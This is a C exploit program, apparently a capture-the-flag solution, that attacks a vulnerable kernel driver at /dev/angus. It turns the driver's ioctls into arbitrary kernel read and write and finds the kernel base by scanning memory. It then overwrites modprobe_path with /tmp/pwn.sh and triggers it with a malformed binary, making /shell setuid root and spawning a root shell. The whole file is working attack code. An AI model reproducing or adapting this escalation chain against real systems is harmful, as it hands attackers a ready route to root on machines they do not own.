#define _GNU_SOURCE
#include "alloca.h"     // for alloca
#include <fcntl.h>      // for open, O_RDWR
#include <inttypes.h>   // for uintptr_t, PRIx64, uint8_t
#include <stdbool.h>    // for true
#include <stdio.h>      // for size_t, NULL, printf, perror
#include <stdlib.h>     // for system, EXIT_FAILURE, EXIT_SUCCESS
#include <string.h>     // for memmem
#include <sys/ioctl.h>  // for ioctl
#include <sys/mman.h>   // for mmap, MAP_ANONYMOUS, MAP_FAILED, MAP_FIXED
#include <unistd.h>     // for execve

#define CMD_GETDATA 0x13370004
#define CMD_DECRYPT 0x13370006

typedef struct {
	char *key;
	char *data;
	size_t keylen;
	size_t datalen;
} XorCipher;

typedef struct {
	char *ptr;
	size_t len;
} request_t;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

#define START		0xffffffff81000000
#define modprobe_patch	0xffffffff81e37e60

static XorCipher *victim = NULL;
static int dev = -1;

void xor(XorCipher *ctx)
{
	for (size_t i = 0; i < ctx->datalen; i++)
		ctx->data[i] ^= ctx->key[i % ctx->keylen];
}

static void dev_getdata(uintptr_t ptr, size_t len)
{
	request_t req;

	req.len = len;
	req.ptr = (char *)ptr;
	ioctl(dev, CMD_GETDATA, &req);
}

static void dev_decrypt(void)
{
	request_t req;

	req.len = 0;
	req.ptr = NULL;
	ioctl(dev, CMD_DECRYPT, &req);
}

static void aar(uintptr_t to, uintptr_t from, size_t len)
{
	victim->data = (char *)from;
	victim->datalen = len;
	dev_getdata(to, len);
}

static void aaw(uintptr_t to, uintptr_t from, size_t len)
{
	char *data = NULL;

	data = alloca(len);
	aar((uintptr_t)data, to, len);

	victim->key = (char *)from;
	victim->data = data;
	victim->keylen = len;
	victim->datalen = len;
	xor(victim);

	victim->key = data;
	victim->data = (char *)to;
	dev_decrypt();
}

static void search_startup_64(void)
{
	size_t buf_len = 0x1000;
	uint8_t *buf = NULL;
	uintptr_t data[7];
	uintptr_t start;
	void *startup_64;

	data[0] = 0x4800e03f51258d48;
	data[1] = 0xe856fffffff23d8d;
	data[2] = 0x48106a5e000005dc;
	data[3] = 0x485000000003058d;
	data[4] = 0x8d48000000fae8cb;
	data[5] = 0x0de856ffffffd33d;
	data[6] = 0x600005485e000002;

	start = START;
	buf = alloca(buf_len);
	while (true) {
		aar((uintptr_t)buf, start, buf_len);
		if ((startup_64 = memmem(buf, buf_len, data, sizeof(data)))) {
			offset = (uintptr_t)startup_64 - (uintptr_t)buf +
				 start - START;
			printf("[+] offset: %#" PRIx64 "\n", offset);
			break;
		}
		start += buf_len;
	}
}

int main(void)
{
	void *ret;

	dev = open("/dev/angus", O_RDWR);
	if (dev == -1) {
		perror("[-] open");
		return EXIT_FAILURE;
	}

	ret = mmap(0, 0x1000, PROT_READ | PROT_WRITE,
		   MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1,
		   0);
	if (ret == MAP_FAILED) {
		perror("[-] mmap");
		return EXIT_FAILURE;
	}

	printf("[+] searching startup_64 ...\n");
	search_startup_64();

	const char evil[] = "/tmp/pwn.sh";
	aaw(OFFSET(modprobe_patch), (uintptr_t)evil, sizeof(evil));

	system("echo -e '"
	       "#!/bin/sh\n"
	       "chown root:root /shell\n"
	       "chmod 6777 /shell"
	       "'"
	       ">/tmp/pwn.sh");
	system("chmod +x /tmp/pwn.sh");
	system("echo -e '\xff\xff\xff\xff' > /tmp/pwn");
	system("chmod +x /tmp/pwn");
	system("/tmp/pwn");

	printf("[+] get r00t!\n");
	execve("/shell", (char *[]){ "/bin/sh", NULL }, NULL);
	return EXIT_SUCCESS;
}
